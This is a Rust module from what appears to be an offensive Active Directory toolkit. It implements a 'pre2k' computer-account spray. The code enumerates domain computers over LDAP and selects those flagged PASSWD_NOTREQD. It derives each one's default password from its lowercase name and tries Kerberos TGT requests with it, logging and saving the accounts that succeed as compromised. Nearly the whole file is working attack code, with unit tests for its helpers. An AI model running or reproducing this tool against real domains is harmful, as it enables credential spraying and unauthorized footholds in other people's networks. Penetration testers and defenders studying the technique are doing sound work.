//! Pre-Windows-2000 Computer Attack (pre2k).
//!
//! Computer accounts created before Windows 2000 were provisioned with a
//! *blank* machine password and the `PASSWD_NOTREQD` (0x20) UAC flag. Such
//! accounts authenticate with the computer name itself as the password
//! (lowercase, no trailing `$`, truncated to 14 chars).
//!
//! This module enumerates computer accounts, filters those with the
//! `PASSWD_NOTREQD` flag, and attempts a Kerberos AS-REQ with the derived
//! password. A successful AS-REQ proves the machine account password is
//! blank/default -- an immediate foothold (impersonate the computer, RBCD,
//! resource access as that machine).

use crate::runner::HuntConfig;
use colored::Colorize;
use indicatif::{ProgressBar, ProgressStyle};
use overthrone_core::error::{OverthroneError, Result};
use overthrone_core::proto::kerberos;
use overthrone_core::proto::ldap;
use serde::{Deserialize, Serialize};
use std::path::PathBuf;
use tracing::{debug, info, warn};

/// UAC bit: password not required (blank/default machine password)
const UAC_PASSWD_NOTREQD: u32 = 0x0000_0020;
/// UAC bit: account is disabled
const UAC_ACCOUNT_DISABLE: u32 = 0x0000_0002;
/// NetBIOS computer name length limit (password derivation)
const MAX_NETBIOS_NAME: usize = 15;

// ===========================================================
// Configuration
// ===========================================================

/// Configuration for the pre2k computer spray.
#[derive(Debug, Clone)]
pub struct Pre2kConfig {
    /// Specific computer accounts to target (skip LDAP enumeration)
    pub target_computers: Vec<String>,
    /// Only target enabled accounts
    pub skip_disabled: bool,
    /// Include computers without PASSWD_NOTREQD in the attempt set
    pub force_all: bool,
    /// Output file for compromised machine accounts
    pub output_file: Option<PathBuf>,
}

impl Default for Pre2kConfig {
    fn default() -> Self {
        Self {
            target_computers: Vec::new(),
            skip_disabled: true,
            force_all: false,
            output_file: None,
        }
    }
}

// ===========================================================
// Result
// ===========================================================

/// A single computer account authentication result.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Pre2kAccount {
    /// Machine account name (with trailing `$`)
    pub sam_account_name: String,
    /// Distinguished name
    pub distinguished_name: String,
    /// Derived candidate password (lowercase NetBIOS name, <=14 chars)
    pub candidate_password: String,
    /// Whether the derived password authenticated successfully
    pub authenticated: bool,
    /// Error string when authentication failed (None on success)
    pub error: Option<String>,
}

/// Result of a pre2k run.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Pre2kResult {
    /// All accounts tested
    pub accounts: Vec<Pre2kAccount>,
    /// Number of accounts tested
    pub tested: usize,
    /// Compromised accounts (authenticated with derived password)
    pub compromised: Vec<String>,
}

// ===========================================================
// Helpers
// ===========================================================

/// Derive the pre2k candidate password from a machine account name:
/// strip `$`, lowercase, truncate to 14 chars (NetBIOS name minus null).
pub fn derive_candidate_password(sam_account_name: &str) -> String {
    let name = sam_account_name.trim_end_matches('$').to_lowercase();
    name.chars().take(MAX_NETBIOS_NAME - 1).collect()
}

/// Test whether a UAC value marks the account as PASSWD_NOTREQD.
pub fn has_passwd_notreqd(uac: u32) -> bool {
    uac & UAC_PASSWD_NOTREQD != 0
}

// ===========================================================
// Core Attack
// ===========================================================

/// Attempt a Kerberos AS-REQ for a machine account with the derived
/// candidate password. Returns Ok(()) when authentication succeeds.
async fn try_machine_auth(
    dc_ip: &str,
    domain: &str,
    sam_account_name: &str,
    candidate: &str,
) -> std::result::Result<(), String> {
    match kerberos::request_tgt(dc_ip, domain, sam_account_name, candidate, false).await {
        Ok(_) => Ok(()),
        Err(e) => {
            let msg = e.to_string();
            if msg.contains("PREAUTH_REQUIRED")
                || msg.contains("KRB_ERROR 25")
                || msg.contains("KRB_AP_ERR")
            {
                Err("preauth_required".to_string())
            } else {
                Err(msg)
            }
        }
    }
}

/// Main entry point: enumerate computer accounts and spray the derived
/// pre2k passwords.
pub async fn run_pre2k(config: &HuntConfig, pc: &Pre2kConfig) -> Result<Pre2kResult> {
    info!("{}", "=== PRE2K COMPUTER SPRAY ===".bold().cyan());

    // Step 1: Build the target list.
    let targets: Vec<(String, String, u32)> = if pc.target_computers.is_empty() {
        let mut conn = if config.use_hash {
            ldap::LdapSession::connect_with_hash(
                &config.dc_ip,
                &config.domain,
                &config.username,
                &config.secret,
                config.use_ldaps,
            )
            .await?
        } else {
            ldap::LdapSession::connect(
                &config.dc_ip,
                &config.domain,
                &config.username,
                &config.secret,
                config.use_ldaps,
            )
            .await?
        };

        let computers = conn.enumerate_computers().await?;
        conn.disconnect().await?;
        info!("LDAP: found {} computer accounts", computers.len());

        computers
            .into_iter()
            .filter(|c| {
                if pc.skip_disabled && c.user_account_control & UAC_ACCOUNT_DISABLE != 0 {
                    return false;
                }
                if !pc.force_all && !has_passwd_notreqd(c.user_account_control) {
                    return false;
                }
                true
            })
            .map(|c| {
                (
                    c.sam_account_name,
                    c.distinguished_name,
                    c.user_account_control,
                )
            })
            .collect()
    } else {
        pc.target_computers
            .iter()
            .map(|name| (name.clone(), String::new(), 0))
            .collect()
    };

    if targets.is_empty() {
        warn!("No PASSWD_NOTREQD computers found");
        return Ok(Pre2kResult {
            accounts: Vec::new(),
            tested: 0,
            compromised: Vec::new(),
        });
    }

    // Step 2: Spray the derived passwords.
    let pb = ProgressBar::new(targets.len() as u64);
    pb.set_style(
        ProgressStyle::default_bar()
            .template("{spinner:.yellow} [{bar:40.cyan/dim}] {pos}/{len} pre2k {msg}")
            .unwrap_or_else(|e| {
                warn!("Progress bar template error: {e}");
                ProgressStyle::default_bar()
            })
            .progress_chars("█▓░"),
    );

    let mut accounts = Vec::new();
    let mut compromised = Vec::new();

    for (sam, dn, uac) in &targets {
        pb.set_message(sam.clone());
        let candidate = derive_candidate_password(sam);

        let entry = match try_machine_auth(&config.dc_ip, &config.domain, sam, &candidate).await {
            Ok(()) => {
                debug!(
                    "pre2k: {} authenticated with derived password",
                    sam.bold().green()
                );
                compromised.push(sam.clone());
                Pre2kAccount {
                    sam_account_name: sam.clone(),
                    distinguished_name: dn.clone(),
                    candidate_password: candidate,
                    authenticated: true,
                    error: None,
                }
            }
            Err(reason) => {
                debug!("pre2k: {} failed: {}", sam, reason);
                Pre2kAccount {
                    sam_account_name: sam.clone(),
                    distinguished_name: dn.clone(),
                    candidate_password: candidate,
                    authenticated: false,
                    error: Some(reason),
                }
            }
        };
        accounts.push(entry);
        let _ = uac;
    }
    pb.finish_and_clear();

    // Step 3: Report.
    for name in &compromised {
        info!(
            " {} pre2k compromise: {} -- blank/default machine password",
            "[+]".green().bold(),
            name.bold()
        );
    }
    info!(
        "pre2k: {} compromised of {} tested",
        compromised.len(),
        targets.len()
    );

    let result = Pre2kResult {
        accounts,
        tested: targets.len(),
        compromised,
    };

    if let Some(path) = &pc.output_file
        && let Err(e) = save_compromised(path, &result).await
    {
        warn!("Could not write output file: {e}");
    }

    Ok(result)
}

/// Write compromised machine accounts to a file (one per line).
async fn save_compromised(path: &PathBuf, result: &Pre2kResult) -> Result<()> {
    let mut content = String::new();
    for name in &result.compromised {
        content.push_str(name);
        content.push('\n');
    }
    tokio::fs::write(path, content)
        .await
        .map_err(|e| OverthroneError::custom(format!("write output file: {e}")))?;
    info!("pre2k: compromised accounts written to {}", path.display());
    Ok(())
}

// ===========================================================
// Tests
// ===========================================================

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_default_config() {
        let c = Pre2kConfig::default();
        assert!(c.target_computers.is_empty());
        assert!(c.skip_disabled);
        assert!(!c.force_all);
        assert!(c.output_file.is_none());
    }

    #[test]
    fn test_derive_candidate_password() {
        assert_eq!(derive_candidate_password("WS01$"), "ws01");
        assert_eq!(derive_candidate_password("ws01"), "ws01");
        assert_eq!(derive_candidate_password("DC01$"), "dc01");
        // Uppercase input is lowercased
        assert_eq!(derive_candidate_password("FILESERVER01$"), "fileserver01");
        // Truncation to 14 chars
        assert_eq!(
            derive_candidate_password("verylonghostname12345$"),
            "verylonghostna"
        );
        assert_eq!(derive_candidate_password("$"), "");
    }

    #[test]
    fn test_has_passwd_notreqd() {
        assert!(has_passwd_notreqd(0x20));
        assert!(has_passwd_notreqd(0x21)); // PASSWD_NOTREQD + disabled
        assert!(has_passwd_notreqd(0x400020));
        assert!(!has_passwd_notreqd(0));
        assert!(!has_passwd_notreqd(0x2));
        assert!(!has_passwd_notreqd(0x400000));
    }

    #[test]
    fn test_pre2k_account_serialization() {
        let a = Pre2kAccount {
            sam_account_name: "WS01$".to_string(),
            distinguished_name: "CN=WS01,CN=Computers,DC=corp,DC=local".to_string(),
            candidate_password: "ws01".to_string(),
            authenticated: true,
            error: None,
        };
        let json = serde_json::to_string(&a).unwrap();
        let back: Pre2kAccount = serde_json::from_str(&json).unwrap();
        assert_eq!(back.sam_account_name, "WS01$");
        assert!(back.authenticated);
        assert!(back.error.is_none());
    }

    #[test]
    fn test_pre2k_result_serialization() {
        let r = Pre2kResult {
            accounts: vec![Pre2kAccount {
                sam_account_name: "WS01$".to_string(),
                distinguished_name: String::new(),
                candidate_password: "ws01".to_string(),
                authenticated: true,
                error: None,
            }],
            tested: 1,
            compromised: vec!["WS01$".to_string()],
        };
        let json = serde_json::to_string(&r).unwrap();
        let back: Pre2kResult = serde_json::from_str(&json).unwrap();
        assert_eq!(back.tested, 1);
        assert_eq!(back.compromised, vec!["WS01$"]);
    }
}
